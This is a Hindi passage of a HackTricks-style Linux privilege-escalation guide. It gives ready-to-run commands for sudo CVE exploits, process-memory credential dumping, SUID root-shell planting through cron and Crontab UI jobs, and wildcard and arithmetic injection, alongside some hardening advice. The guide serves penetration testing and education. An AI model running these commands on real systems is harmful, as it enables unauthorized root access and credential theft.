# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

अधिक व्यापक पृष्ठभूमि और ऐतिहासिक enumeration workflows के लिए, references में सूचीबद्ध g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation और linux-private-i संसाधनों की तुलना करें।<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## सिस्टम की जानकारी

### OS की जानकारी

आइए, चल रहे OS के बारे में जानकारी जुटाना शुरू करें.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

यदि आपको `PATH` वेरिएबल में मौजूद किसी भी फ़ोल्डर पर **लिखने की अनुमति** है, तो आप कुछ libraries या binaries को hijack कर सकते हैं:

```bash
echo $PATH
```

### Env जानकारी

Environment variables में दिलचस्प जानकारी, passwords या API keys?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Kernel version की जाँच करें और देखें कि क्या privileges escalate करने के लिए कोई exploit इस्तेमाल किया जा सकता है।

[Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md) में local escalation के मामले और Binary Exploitation में Linux kernel पर लिखे गए विस्तृत लेखों के links दिए गए हैं। किसी case study को test करने से पहले प्रभावित build और configuration की पुष्टि करें।

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

आपको यहाँ vulnerable kernel की एक अच्छी सूची और कुछ पहले से **compiled exploits** मिल सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)।<sup>[[12]](#references)</sup>\
अन्य साइटें जहाँ आपको कुछ **compiled exploits** मिल सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel versions निकालने के लिए आप यह कर सकते हैं:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

वे tools जो kernel exploits खोजने में मदद कर सकते हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim में execute करें, यह केवल kernel 2.x के exploits की जाँच करता है)

हमेशा **Google पर kernel version खोजें**। हो सकता है कि आपका kernel version किसी kernel exploit में लिखा हो, जिससे आपको यकीन हो जाएगा कि यह exploit मान्य है।

Kernel exploitation की अतिरिक्त techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux में Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo संस्करण

इनमें दिखाई देने वाले vulnerable sudo versions के आधार पर:

```bash
searchsploit sudo
```

आप इस grep से जाँच सकते हैं कि sudo version vulnerable है या नहीं।

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 से 1.9.17** तक में, जब sudo किसी user-controlled directory से `/etc/nsswitch.conf` लोड करता है, तो unprivileged local users `--chroot` option के ज़रिए root तक privilege escalation कर सकते हैं; upstream ने इसे **1.9.17p1** में ठीक किया। संबंधित paths में मौजूद हर executable root-setuid sudo binary जाँचें, क्योंकि `sudo -V` केवल `PATH` से चुनी गई binary की जानकारी देता है। Distribution packages upstream version string बदले बिना भी fix को backport कर सकते हैं, इसलिए vendor package का status भी जाँचें। [sudo maintainer की advisory](https://www.openwall.com/lists/oss-security/2025/06/30/3) देखें।<sup>[[28]](#references)[[29]](#references)</sup>

इस [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) का exploit करने के लिए यह [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) है। Exploit चलाने से पहले सुनिश्चित करें कि आपका `sudo` version vulnerable है और उसमें `chroot` feature समर्थित है।  

अधिक जानकारी के लिए मूल [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) देखें।<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

Upstream sudo **1.8.8 से 1.9.17** तक, host-based sudoers rules को जाँचते समय `sudo -h <host>` से दिया गया **user-supplied hostname**, **वास्तविक hostname** के बजाय इस्तेमाल कर सकता है; upstream ने इसे **1.9.17p1** में ठीक किया। चुने गए host पर user के पास अब भी मेल खाती sudoers entry होनी चाहिए। Local policy के साथ vendor backports और अन्य sudo binaries भी जाँचें। [sudo maintainer की advisory](https://www.openwall.com/lists/oss-security/2025/06/30/2) देखें।<sup>[[29]](#references)</sup>

आवश्यकताएँ:
- Vulnerable sudo version
- Host-specific sudoers rules (host मौजूदा hostname या `ALL` नहीं होना चाहिए)

sudoers pattern का उदाहरण:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

अनुमति प्राप्त host को spoof करके Exploit करें:

```bash
sudo -h devbox id
sudo -h devbox -i
```

यदि चुने गए नाम का resolution अवरुद्ध हो, तो जाँचें कि वह नाम host पर कैसे resolve होता है। किसी log या configuration file में नाम दिखने मात्र से वह resolvable नहीं हो जाता, और `/etc/hosts` बदलने के लिए आम तौर पर privileged write access की आवश्यकता होती है।

#### sudo < v1.8.28

इस [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) के लिए एक प्रभावी sudo rule आवश्यक है, जो root को छोड़कर `ALL` users के रूप में command चलाने की अनुमति देता हो, जैसे `(ALL, !root) /bin/bash`। Caller को authentication requirement सहित उस rule का उपयोग करने की अनुमति भी होनी चाहिए। Installed package की advisory जाँचें: vendors ने fix को ऐसे releases में backport किया है जिनका दिखाया गया upstream version अभी भी 1.8.28 से कम है। केवल `!root` rule या पुराना version होना exposure की पुष्टि नहीं करता। Passive enumeration के दौरान कोई privileged command न चलाएँ।

```
sudo -u#-1 /bin/bash
```

### Dmesg signature verification विफल

इस vuln का exploit कैसे किया जा सकता है, इसका एक **उदाहरण** देखने के लिए **HTB के smasher2 box** को देखें.

```bash
dmesg 2>/dev/null | grep "signature"
```

### सिस्टम की अधिक enumeration

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## संभावित सुरक्षा उपायों की सूची बनाएं

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

अगर आप किसी container के अंदर हैं, तो पहले container-security सेक्शन से शुरुआत करें और फिर runtime-specific abuse pages पर जाएँ:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## ड्राइव्स

जाँचें कि **क्या mounted और unmounted है**, कहाँ और क्यों। अगर कुछ unmounted है, तो आप उसे mount करके निजी जानकारी जाँच सकते हैं.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## उपयोगी सॉफ़्टवेयर

उपयोगी binaries की सूची बनाएं

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

यह भी जाँचें कि **कोई कंपाइलर इंस्टॉल है या नहीं**। यह तब उपयोगी है जब आपको किसी kernel exploit का उपयोग करना हो, क्योंकि इसे उसी मशीन पर (या उससे मिलती-जुलती मशीन पर) कंपाइल करने की सलाह दी जाती है।

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### इंस्टॉल किया गया कमजोर सॉफ़्टवेयर

**इंस्टॉल किए गए packages और services के version** की जाँच करें। हो सकता है कि Nagios का कोई पुराना version हो (उदाहरण के लिए), जिसका privilege escalation के लिए exploit किया जा सके…\
ज़्यादा संदिग्ध इंस्टॉल किए गए software के version की मैन्युअल रूप से जाँच करने की सलाह दी जाती है।

```bash
dpkg -l #Debian
rpm -qa #Centos
```

यदि आपके पास machine का SSH access है, तो आप machine में इंस्टॉल पुराने और vulnerable software की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी जानकारी दिखाएँगी, जिसका अधिकांश हिस्सा उपयोगी नहीं होगा। इसलिए OpenVAS या इसी तरह के कुछ applications का उपयोग करने की सलाह दी जाती है, जो जाँचेंगे कि इंस्टॉल किए गए किसी software version में ज्ञात exploits के लिए vulnerability है या नहीं_

## Processes

देखें कि **कौन-सी प्रक्रियाएँ** execute हो रही हैं और जाँचें कि क्या किसी process के पास **उसकी ज़रूरत से ज़्यादा privileges हैं** (शायद कोई tomcat root के रूप में execute हो रहा हो?)

```bash
ps aux
ps -ef
top -n 1
```

हमेशा जाँचें कि कोई [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) चल तो नहीं रहा है; privileges escalate करने के लिए उसका दुरुपयोग किया जा सकता है। **Linpeas** process की command line में `--inspect` parameter की जाँच करके इनका पता लगाता है।\
यह भी **जाँचें कि processes की binaries पर आपके क्या privileges हैं**; हो सकता है कि आप किसी की binary overwrite कर सकें।

### अलग-अलग users के parent-child chains

किसी **अलग user** के अंतर्गत चलने वाली child process का अपने parent से अलग user होना अपने-आप में दुर्भावनापूर्ण नहीं है, लेकिन यह एक उपयोगी **triage signal** है। कुछ transitions अपेक्षित होते हैं (`root` द्वारा service user शुरू करना, login managers द्वारा session processes बनाना), लेकिन असामान्य chains से wrappers, debug helpers, persistence या runtime trust boundaries की कमज़ोरियाँ सामने आ सकती हैं।

त्वरित समीक्षा:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

अगर आपको कोई आश्चर्यजनक chain मिले, तो parent command line और उसके व्यवहार को प्रभावित करने वाली सभी फ़ाइलों (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments) की जाँच करें। कई वास्तविक privesc paths में child स्वयं writable नहीं था, लेकिन **parent-controlled config** या helper chain writable थी।

### Deleted executables और deleted-open files

Runtime artifacts अक्सर **हटाए जाने के बाद भी** उपलब्ध रहते हैं। यह privilege escalation और उन processes से evidence recover करने, दोनों के लिए उपयोगी है जिनके पास पहले से sensitive files खुली हैं।

Deleted executables की जाँच करें:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

यदि `/proc/<PID>/exe` `(deleted)` की ओर संकेत करता है, तो process अभी भी memory से पुरानी binary image चला रहा है। यह जाँच करने का एक मज़बूत संकेत है, क्योंकि:

- हटाए गए executable में दिलचस्प strings या credentials हो सकते हैं
- चल रहा process अब भी उपयोगी file descriptors दिखा सकता है
- हटाई गई privileged binary हालिया छेड़छाड़ या सफ़ाई के प्रयास का संकेत हो सकती है

सभी deleted-open files इकट्ठा करें:

```bash
lsof +L1
```

यदि आपको कोई दिलचस्प descriptor मिले, तो उसे सीधे प्राप्त करें:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

यह विशेष रूप से तब उपयोगी होता है, जब किसी process में अब भी कोई हटाया गया secret, script, database export या flag file खुली हो।

### Process की निगरानी

Processes की निगरानी के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग किया जा सकता है। बार-बार चलाए जा रहे vulnerable processes या कुछ आवश्यकताएँ पूरी होने पर चलने वाले processes की पहचान करने में यह बहुत उपयोगी हो सकता है।

#### sudo के अंतर्गत Linux ProcMon

[Linux के लिए ProcMon](https://github.com/microsoft/ProcMon-for-Linux) चुने हुए processes और system calls को trace कर सकता है और SQLite trace save कर सकता है। अगर `sudo -l` बिना किसी पाबंदी के ऐसा `procmon` command चलाने देता है जिसमें root की क्षमताएँ हों, तो विचार करें कि क्या वह किसी दूसरे user के process के input या output को देख सकता है। यह अनुमति केवल समीक्षा के लिए एक सुराग है: tracer का समर्थन, प्रभावी policy और किसी उपयुक्त process की गतिविधि—ये सभी मायने रखते हैं। Trace files में secrets हो सकते हैं, इसलिए अधिकृत exports को सावधानी से जाँचें और असंबंधित processes को collect करने से बचें।

### Process की memory

Server की कुछ services **credentials को memory में clear text में save करती हैं**।\
आम तौर पर, दूसरे users के processes की memory पढ़ने के लिए आपको **root privileges** की आवश्यकता होगी। इसलिए, यह आम तौर पर तब ज़्यादा उपयोगी होता है जब आपके पास पहले से root access हो और आप और credentials खोजना चाहते हों।\
हालाँकि, याद रखें कि **एक regular user के रूप में आप अपने processes की memory पढ़ सकते हैं**।

> [!WARNING]
> ध्यान दें कि आजकल ज़्यादातर machines **डिफ़ॉल्ट रूप से ptrace की अनुमति नहीं देतीं**, यानी आप अपने unprivileged user के दूसरे processes को dump नहीं कर सकते।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की पहुँच नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते उनका uid समान हो। ptracing का यह पारंपरिक तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability आवश्यक है।
> - **kernel.yama.ptrace_scope = 3**: ptrace से किसी भी process को trace नहीं किया जा सकता। इसे set करने के बाद ptracing को फिर से सक्षम करने के लिए reboot करना होगा।

एक same-UID process जो थोड़े समय के लिए password vault को unlock करता है, credentials की एक अलग सीमा बन सकता है। जब tracing की अनुमति हो, तो कोई सक्रिय, dumpable process अपने input syscalls या memory के ज़रिए vault password उजागर कर सकता है, भले ही encrypted vault file सुरक्षित रहे। `ptrace_scope=0` केवल एक पूर्वशर्त है: समान credentials, target का dumpability, अन्य Linux security modules और process का जीवनकाल भी मायने रखते हैं। Vault की किसी entry को Unix root login के रूप में इस्तेमाल करने के लिए credentials का अलग से reuse check करना होगा। नियमित enumeration में policy और संभावित process या vault paths की जानकारी दें—input capture न करें और secrets न दिखाएँ। [kernel का Yama documentation](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) और [ptrace access checks](https://man7.org/linux/man-pages/man2/ptrace.2.html) देखें।

#### GDB

अगर आपके पास किसी FTP service की memory का access है (उदाहरण के लिए), तो आप उसका Heap प्राप्त करके उसमें credentials खोज सकते हैं।

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB स्क्रिप्ट

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाता है कि उस process के** virtual address space **में memory कैसे mapped है**; यह **हर mapped region की permissions** भी दिखाता है। **mem** pseudo file **खुद process की memory को expose करती है**। **maps** file से हमें पता चलता है कि कौन-से **memory regions readable हैं** और उनके offsets क्या हैं। इस जानकारी का इस्तेमाल करके हम **mem file में seek करते हैं और सभी readable regions को dump करके** एक file में सहेजते हैं।

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` सिस्टम की **physical** memory तक पहुँच प्रदान करता है, virtual memory तक नहीं। Kernel के virtual address space को /dev/kmem का उपयोग करके access किया जा सकता है।\
आमतौर पर, `/dev/mem` केवल **root** और **kmem** group के लिए readable होता है।

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux के लिए ProcDump

ProcDump, Windows के Sysinternals टूल्स सूट के क्लासिक ProcDump टूल का Linux के लिए नया रूप है। इसे [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) से प्राप्त करें।

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Tools

किसी process memory को dump करने के लिए आप ये इस्तेमाल कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप root की आवश्यकता को मैन्युअल रूप से हटा सकते हैं और अपने स्वामित्व वाले process को dump कर सकते हैं
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) से Script A.5 (इसके लिए root आवश्यक है)

### Process Memory से Credentials

#### मैन्युअल उदाहरण

अगर आपको पता चले कि authenticator process चल रहा है:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

आप process को dump कर सकते हैं (process की memory dump करने के अलग-अलग तरीकों के लिए पिछले sections देखें) और memory में credentials खोज सकते हैं:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) memory और कुछ **जानी-मानी files** से **clear text credentials चुराएगा**। इसे ठीक से काम करने के लिए root privileges की आवश्यकता होती है।

| सुविधा                                            | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regex खोजें/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

अगर कोई web “Crontab UI” panel (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback से bind है, तब भी आप SSH local port-forwarding के ज़रिए उस तक पहुँच सकते हैं और privilege escalation के लिए एक privileged job बना सकते हैं।<sup>[[1]](#references)[[4]](#references)</sup>

आम chain
- loopback-only port (जैसे, 127.0.0.1:8000) और Basic-Auth realm का पता लगाएँ: `ss -ntlp` / `curl -v localhost:8000`
- operational artifacts में credentials खोजें:
  - `zip -P <password>` वाले backups/scripts
  - systemd unit में `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` मौजूद हो
- Tunnel बनाएँ और login करें:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- हाई-प्रिविलेज वाला job बनाएँ और तुरंत चलाएँ (SUID shell बनाता है):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसका उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- Crontab UI को root के रूप में न चलाएँ; एक dedicated user का उपयोग करें और permissions न्यूनतम रखें
- localhost से bind करें और firewall/VPN के ज़रिए access को अतिरिक्त रूप से प्रतिबंधित करें; passwords दोबारा इस्तेमाल न करें
- unit files में secrets एम्बेड करने से बचें; secret stores या केवल root के लिए उपलब्ध EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें

जाँचें कि कोई scheduled job vulnerable तो नहीं है। शायद आप root द्वारा execute की जाने वाली किसी script का फ़ायदा उठा सकें (wildcard vuln? क्या आप उन files को modify कर सकते हैं जिन्हें root इस्तेमाल करता है? symlinks का उपयोग करें? उस directory में specific files बनाएँ जिसे root इस्तेमाल करता है?)

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

यदि `run-parts` का उपयोग किया जाता है, तो जांचें कि वास्तव में कौन-से नाम निष्पादित होंगे:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

इससे false positives से बचा जा सकता है। किसी writable periodic directory का उपयोग तभी है, जब आपके payload filename का नाम स्थानीय `run-parts` नियमों से मेल खाता हो।

### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आपको PATH मिल सकता है: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि "user" उपयोगकर्ता के पास /home/user पर write करने के privileges हैं_)

अगर इस crontab में root उपयोगकर्ता path सेट किए बिना कोई command या script चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो, आप इसका उपयोग करके root shell प्राप्त कर सकते हैं:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron using a script with a wildcard (Wildcard Injection)

अगर root द्वारा कोई script execute की जाती है और किसी command में “**\***” मौजूद है, तो आप इसका इस्तेमाल अप्रत्याशित चीज़ें (जैसे privesc) करने के लिए कर सकते हैं। उदाहरण:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**अगर wildcard से पहले कोई path दिया गया हो, जैसे** _**/some/path/\***_ **, तो यह vulnerable नहीं होता (यहाँ तक कि** _**./\***_ **भी नहीं)।**

wildcard exploitation की अन्य तरकीबों के लिए यह पेज पढ़ें:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron log parsers में Bash arithmetic expansion injection

Bash arithmetic untrusted text को expression के रूप में समझ सकता है। प्रभावित Bash contexts में, उस expression के अंदर array subscript किसी command substitution को evaluate कर सकता है। अगर कोई privileged cron/parser attacker-controlled log text को ऐसी arithmetic comparison में डालता है, तो substitution parser की identity के साथ run हो सकता है।<sup>[[22]](#references)</sup> यह Bash expression और version पर निर्भर करता है; expanded variable में अकेली `$(...)0` string अपने-आप में re-evaluation का भरोसेमंद उदाहरण नहीं है।

Input file metadata या user-writable location से पढ़े गए किसी अन्य field से भी आ सकता है। उदाहरण के लिए, एक privileged cleanup script जो image का `Producer` tag पढ़ता है और उसकी तुलना `[[ "$producer" -eq "expected" ]]` से करता है, arithmetic comparison करता है, भले ही variable quoted हो। Scheduled identity का पता लगाएँ, tag देने वाली संभावित files की जाँच करें, comparison से पहले होने वाले transformations देखें, और Bash के सटीक behavior को समझें। Text labels के लिए string comparison का उपयोग करें; numbers के लिए arithmetic से पहले input को decimal digits के रूप में validate करें। [Bash arithmetic rules](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html) देखें।

- आमतौर पर vulnerable pattern:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- array-subscript mechanism के व्यवहार की सुरक्षित स्थानीय probe (कोई privileged process या file परिवर्तन नहीं):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

वास्तव में schedule की गई script और उसके द्वारा खोले जाने वाले literal input path का पता लगाएँ। भले ही log file खुद writable न हो, लेकिन जो user उसके non-sticky parent को लिख और traverse कर सकता है, वह उसकी directory entry बदलने में सक्षम हो सकता है; `namei -l` इन permissions में अंतर पहचानने में मदद करता है। कोई अलग writable log path, unreadable scheduler या ऐसा parser जो उस field को Bash arithmetic के रूप में evaluate ही नहीं करता, इस path की पुष्टि नहीं करता।

### Cron script को overwrite करना और symlink

अगर आप **root द्वारा execute की जाने वाली cron script को modify कर सकते हैं**, तो बहुत आसानी से shell पा सकते हैं:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

यदि root द्वारा execute की जाने वाली script ऐसे **directory** का उपयोग करती है जिस पर आपका पूरा access है, तो उस folder को delete करके किसी दूसरे folder की ओर symlink folder बनाना उपयोगी हो सकता है, जहाँ आपकी नियंत्रित script मौजूद हो.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink validation और सुरक्षित फ़ाइल हैंडलिंग

विशेषाधिकार प्राप्त scripts/binaries की समीक्षा करते समय, जो path के ज़रिए फ़ाइलें पढ़ते या लिखते हैं, जाँचें कि वे links को कैसे संभालते हैं:

- `stat()` symlink को follow करता है और target का metadata लौटाता है।
- `lstat()` स्वयं link का metadata लौटाता है।
- `readlink -f` और `namei -l` अंतिम target का पता लगाने और path के हर component की permissions दिखाने में मदद करते हैं।

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

डिफेंडर/डेवलपर के लिए, symlink tricks से बचने के अधिक सुरक्षित तरीकों में शामिल हैं:

- `O_EXCL` के साथ `O_CREAT`: यदि path पहले से मौजूद हो, तो विफल हो जाए (हमलावर द्वारा पहले से बनाए गए links/files को रोकता है)।
- `openat()`: किसी विश्वसनीय directory file descriptor के सापेक्ष काम करता है।
- `mkstemp()`: सुरक्षित permissions के साथ temporary files को atomically बनाता है।

### Writable payloads वाले custom-signed cron binaries
कोई सामान्य user, जो root cron job द्वारा चलाए जाने वाले सटीक binary में लिख सकता है, privilege boundary पार कर सकता है; लेकिन custom signature check किसी unsigned replacement को अस्वीकार कर सकता है। दर्ज किए गए मामले में, root-owned ELF का mode `0760` था, जिससे उसके group का सदस्य उसमें लिख सकता था, जबकि root owner उसे execute कर सकता था। एक दिखाई देने वाले process trace में दिखा कि job के binary चलाने से पहले `objcopy` `.text_sig` extract कर रहा था; पूरी verifier script पढ़ने योग्य नहीं थी।<sup>[[2]](#references)</sup>

